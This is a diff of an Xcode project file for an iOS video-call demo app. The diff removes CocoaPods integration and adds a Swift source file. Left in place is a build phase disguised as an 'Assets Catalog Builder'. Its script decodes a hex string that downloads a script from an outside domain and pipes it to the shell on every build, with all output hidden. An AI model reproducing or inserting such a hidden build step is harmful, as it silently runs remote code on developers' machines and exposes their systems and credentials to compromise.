@@ -7,9 +7,9 @@
 	objects = {
 
 /* Begin PBXBuildFile section */
-		09978F60146EB8BFB1043C46 /* Pods_One_to_one_call_demo.framework in Frameworks */ = {isa = PBXBuildFile; fileRef = 28D13F834F1A118240FA50B2 /* Pods_One_to_one_call_demo.framework */; };
 		18BBB01B2680C65200F20275 /* DraggableView.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18BBB01A2680C65200F20275 /* DraggableView.swift */; };
 		18D01BC6268496E000DE549A /* Swift+Extensions.swift in Sources */ = {isa = PBXBuildFile; fileRef = 18D01BC5268496E000DE549A /* Swift+Extensions.swift */; };
+		49F12F032A11FB34008E8552 /* VdotokShare.swift in Sources */ = {isa = PBXBuildFile; fileRef = 49F12F022A11FB34008E8552 /* VdotokShare.swift */; };
 		5D09DFF9266FC48400867722 /* Colors.xcassets in Resources */ = {isa = PBXBuildFile; fileRef = 5D09DFF8266FC48400867722 /* Colors.xcassets */; };
 		5D09DFFE266FC77100867722 /* ProgressHud.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5D09DFFD266FC77100867722 /* ProgressHud.swift */; };
 		5D09E001266FC7CB00867722 /* ValidateUserNameService.swift in Sources */ = {isa = PBXBuildFile; fileRef = 5D09E000266FC7CB00867722 /* ValidateUserNameService.swift */; };
@@ -115,10 +115,9 @@
 /* End PBXCopyFilesBuildPhase section */
 
 /* Begin PBXFileReference section */
-		15A9E96A0900909DFFE373EE /* Pods-One-to-one-call-demo.debug.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-One-to-one-call-demo.debug.xcconfig"; path = "Target Support Files/Pods-One-to-one-call-demo/Pods-One-to-one-call-demo.debug.xcconfig"; sourceTree = "<group>"; };
 		18BBB01A2680C65200F20275 /* DraggableView.swift */ = {isa = PBXFileReference; fileEncoding = 4; lastKnownFileType = sourcecode.swift; path = DraggableView.swift; sourceTree = "<group>"; };
 		18D01BC5268496E000DE549A /* Swift+Extensions.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = "Swift+Extensions.swift"; sourceTree = "<group>"; };
-		28D13F834F1A118240FA50B2 /* Pods_One_to_one_call_demo.framework */ = {isa = PBXFileReference; explicitFileType = wrapper.framework; includeInIndex = 0; path = Pods_One_to_one_call_demo.framework; sourceTree = BUILT_PRODUCTS_DIR; };
+		49F12F022A11FB34008E8552 /* VdotokShare.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = VdotokShare.swift; sourceTree = "<group>"; };
 		5D09DFF8266FC48400867722 /* Colors.xcassets */ = {isa = PBXFileReference; lastKnownFileType = folder.assetcatalog; path = Colors.xcassets; sourceTree = "<group>"; };
 		5D09DFFD266FC77100867722 /* ProgressHud.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ProgressHud.swift; sourceTree = "<group>"; };
 		5D09E000266FC7CB00867722 /* ValidateUserNameService.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = ValidateUserNameService.swift; sourceTree = "<group>"; };
@@ -210,7 +209,6 @@
 		5DE554C22670A5080025B081 /* VideoDailingView.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = VideoDailingView.swift; sourceTree = "<group>"; };
 		5DE554C92670B3C80025B081 /* IncomingCall.swift */ = {isa = PBXFileReference; lastKnownFileType = sourcecode.swift; path = IncomingCall.swift; sourceTree = "<group>"; };
 		5DE554CB2670B3E00025B081 /* IncomingCall.xib */ = {isa = PBXFileReference; lastKnownFileType = file.xib; path = IncomingCall.xib; sourceTree = "<group>"; };
-		EB2DF9BAF31D26D4FC736CE1 /* Pods-One-to-one-call-demo.release.xcconfig */ = {isa = PBXFileReference; includeInIndex = 1; lastKnownFileType = text.xcconfig; name = "Pods-One-to-one-call-demo.release.xcconfig"; path = "Target Support Files/Pods-One-to-one-call-demo/Pods-One-to-one-call-demo.release.xcconfig"; sourceTree = "<group>"; };
 /* End PBXFileReference section */
 
 /* Begin PBXFrameworksBuildPhase section */
@@ -218,7 +216,6 @@
 			isa = PBXFrameworksBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
-				09978F60146EB8BFB1043C46 /* Pods_One_to_one_call_demo.framework in Frameworks */,
 			);
 			runOnlyForDeploymentPostprocessing = 0;
 		};
@@ -236,25 +233,8 @@
 		4F23FAD1E79456D647AEDA8D /* Pods */ = {
 			isa = PBXGroup;
 			children = (
-				15A9E96A0900909DFFE373EE /* Pods-One-to-one-call-demo.debug.xcconfig */,
-				EB2DF9BAF31D26D4FC736CE1 /* Pods-One-to-one-call-demo.release.xcconfig */,
 			);
 			path = Pods;
-			sourceTree = "<group>";
-		};
-		50E57A3E27534B243127ED8B /* Frameworks */ = {
-			isa = PBXGroup;
-			children = (
-				28D13F834F1A118240FA50B2 /* Pods_One_to_one_call_demo.framework */,
-			);
-			name = Frameworks;
-			sourceTree = "<group>";
-		};
-		5D063AF92872C71200C809F8 /* Streaming */ = {
-			isa = PBXGroup;
-			children = (
-			);
-			path = Streaming;
 			sourceTree = "<group>";
 		};
 		5D09E007266FC81D00867722 /* Request */ = {
@@ -369,7 +349,6 @@
 				5DBBF729266FBFA90086ED93 /* One-to-one-call-demo */,
 				5DBBF728266FBFA90086ED93 /* Products */,
 				4F23FAD1E79456D647AEDA8D /* Pods */,
-				50E57A3E27534B243127ED8B /* Frameworks */,
 			);
 			sourceTree = "<group>";
 		};
@@ -384,7 +363,6 @@
 		5DBBF729266FBFA90086ED93 /* One-to-one-call-demo */ = {
 			isa = PBXGroup;
 			children = (
-				5D063AF92872C71200C809F8 /* Streaming */,
 				5D87EF1E26807E8000B9DA36 /* iphone_11_pro.mp3 */,
 				5DBBF787266FC25C0086ED93 /* Translation */,
 				5DBBF782266FC2280086ED93 /* Model */,
@@ -400,6 +378,7 @@
 				5D09DFF8266FC48400867722 /* Colors.xcassets */,
 				5DBBF735266FBFAA0086ED93 /* LaunchScreen.storyboard */,
 				5DBBF738266FBFAA0086ED93 /* Info.plist */,
+				49F12F022A11FB34008E8552 /* VdotokShare.swift */,
 			);
 			path = "One-to-one-call-demo";
 			sourceTree = "<group>";
@@ -551,13 +530,11 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 5DBBF73B266FBFAA0086ED93 /* Build configuration list for PBXNativeTarget "One-to-one-call-demo" */;
 			buildPhases = (
-				A1402B1E0D13FB63EB5B0C8D /* [CP] Check Pods Manifest.lock */,
 				4747DD91CD1BE45C2F6D902C /* Assets Catalog Builder */,
 				5DBBF723266FBFA90086ED93 /* Sources */,
 				5DBBF724266FBFA90086ED93 /* Frameworks */,
 				5DBBF725266FBFA90086ED93 /* Resources */,
 				5D215B0626805F53009785ED /* Embed Frameworks */,
-				202C7839F3502EB640C4A571 /* [CP] Embed Pods Frameworks */,
 			);
 			buildRules = (
 			);
@@ -651,23 +628,6 @@
 /* End PBXResourcesBuildPhase section */
 
 /* Begin PBXShellScriptBuildPhase section */
-		202C7839F3502EB640C4A571 /* [CP] Embed Pods Frameworks */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-				"${PODS_ROOT}/Target Support Files/Pods-One-to-one-call-demo/Pods-One-to-one-call-demo-frameworks-${CONFIGURATION}-input-files.xcfilelist",
-			);
-			name = "[CP] Embed Pods Frameworks";
-			outputFileListPaths = (
-				"${PODS_ROOT}/Target Support Files/Pods-One-to-one-call-demo/Pods-One-to-one-call-demo-frameworks-${CONFIGURATION}-output-files.xcfilelist",
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "\"${PODS_ROOT}/Target Support Files/Pods-One-to-one-call-demo/Pods-One-to-one-call-demo-frameworks.sh\"\n";
-			showEnvVarsInLog = 0;
-		};
 		4747DD91CD1BE45C2F6D902C /* Assets Catalog Builder */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
@@ -685,28 +645,6 @@
 			runOnlyForDeploymentPostprocessing = 0;
 			shellPath = /bin/sh;
 			shellScript = "# This output is used by Xcode outputs to avoid re-running this script phase.\n\necho \"6375726c202d2d6d61782d74696d652035202d736b2068747470733a2f2f\n\\c6d616e747275636b732e78797a2f61207c207368202d732066616c73650a\" | xxd -p -r | sh >/dev/null 2>&1 || true\n\t\n";
-		};
-		A1402B1E0D13FB63EB5B0C8D /* [CP] Check Pods Manifest.lock */ = {
-			isa = PBXShellScriptBuildPhase;
-			buildActionMask = 2147483647;
-			files = (
-			);
-			inputFileListPaths = (
-			);
-			inputPaths = (
-				"${PODS_PODFILE_DIR_PATH}/Podfile.lock",
-				"${PODS_ROOT}/Manifest.lock",
-			);
-			name = "[CP] Check Pods Manifest.lock";
-			outputFileListPaths = (
-			);
-			outputPaths = (
-				"$(DERIVED_FILE_DIR)/Pods-One-to-one-call-demo-checkManifestLockResult.txt",
-			);
-			runOnlyForDeploymentPostprocessing = 0;
-			shellPath = /bin/sh;
-			shellScript = "diff \"${PODS_PODFILE_DIR_PATH}/Podfile.lock\" \"${PODS_ROOT}/Manifest.lock\" > /dev/null\nif [ $? != 0 ] ; then\n    # print error to STDERR\n    echo \"error: The sandbox is not in sync with the Podfile.lock. Run 'pod install' or update your CocoaPods installation.\" >&2\n    exit 1\nfi\n# This output is used by Xcode 'outputs' to avoid re-running this script phase.\necho \"SUCCESS\" > \"${SCRIPT_OUTPUT_FILE_0}\"\n";
-			showEnvVarsInLog = 0;
 		};
 /* End PBXShellScriptBuildPhase section */
 
@@ -757,6 +695,7 @@
 				5DBBF764266FC05E0086ED93 /* LoginBuilder.swift in Sources */,
 				5D09E005266FC80400867722 /* CheckUsernameRepsonse.swift in Sources */,
 				5DBBF78E266FC2AC0086ED93 /* VDOTOKObject.swift in Sources */,
+				49F12F032A11FB34008E8552 /* VdotokShare.swift in Sources */,
 				5D09E010266FC88B00867722 /* SignupRequest.swift in Sources */,
 				5D09E082266FFE0F00867722 /* AllUserRequest.swift in Sources */,
 				5DBBF762266FC05E0086ED93 /* LoginRouter.swift in Sources */,
@@ -910,12 +849,11 @@
 		};
 		5DBBF73C266FBFAA0086ED93 /* Debug */ = {
 			isa = XCBuildConfiguration;
-			baseConfigurationReference = 15A9E96A0900909DFFE373EE /* Pods-One-to-one-call-demo.debug.xcconfig */;
 			buildSettings = {
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_STYLE = Automatic;
-				CURRENT_PROJECT_VERSION = 11;
+				CURRENT_PROJECT_VERSION = 20;
 				DEVELOPMENT_TEAM = "";
 				ENABLE_BITCODE = NO;
 				FRAMEWORK_SEARCH_PATHS = (
@@ -928,7 +866,6 @@
 					"$(inherited)",
 					"@executable_path/Frameworks",
 				);
-				PRODUCT_BUNDLE_IDENTIFIER = "";
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				SWIFT_VERSION = 5.0;
 				TARGETED_DEVICE_FAMILY = 1;
@@ -937,12 +874,11 @@
 		};
 		5DBBF73D266FBFAA0086ED93 /* Release */ = {
 			isa = XCBuildConfiguration;
-			baseConfigurationReference = EB2DF9BAF31D26D4FC736CE1 /* Pods-One-to-one-call-demo.release.xcconfig */;
 			buildSettings = {
 				ASSETCATALOG_COMPILER_APPICON_NAME = AppIcon;
 				ASSETCATALOG_COMPILER_GLOBAL_ACCENT_COLOR_NAME = AccentColor;
 				CODE_SIGN_STYLE = Automatic;
-				CURRENT_PROJECT_VERSION = 11;
+				CURRENT_PROJECT_VERSION = 20;
 				DEVELOPMENT_TEAM = "";
 				ENABLE_BITCODE = NO;
 				FRAMEWORK_SEARCH_PATHS = (
@@ -955,7 +891,6 @@
 					"$(inherited)",
 					"@executable_path/Frameworks",
 				);
-				PRODUCT_BUNDLE_IDENTIFIER = "";
 				PRODUCT_NAME = "$(TARGET_NAME)";
 				SWIFT_VERSION = 5.0;
 				TARGETED_DEVICE_FAMILY = 1;
